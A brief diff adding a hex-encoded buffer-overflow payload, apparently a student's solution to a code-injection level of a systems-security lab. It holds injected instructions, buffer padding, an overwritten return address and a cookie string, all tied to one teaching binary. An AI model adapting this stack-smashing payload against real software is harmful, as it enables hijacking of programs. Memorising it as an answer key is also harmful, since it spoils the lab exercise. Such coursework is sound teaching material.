@@ -1,0 +1,8 @@
+48 c7 c7 18 6f 65 55 68 /* rsp + 0x28 + 0x8 with pushq command in *?
+a6 1a 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* padding for buffer */
+00 00 00 00 00 00 00 00
+
+e8 6e 65 55 00 00 00 00 /* rsp address */
+31 30 65 65 31 66 64 66  /* cookie in text */
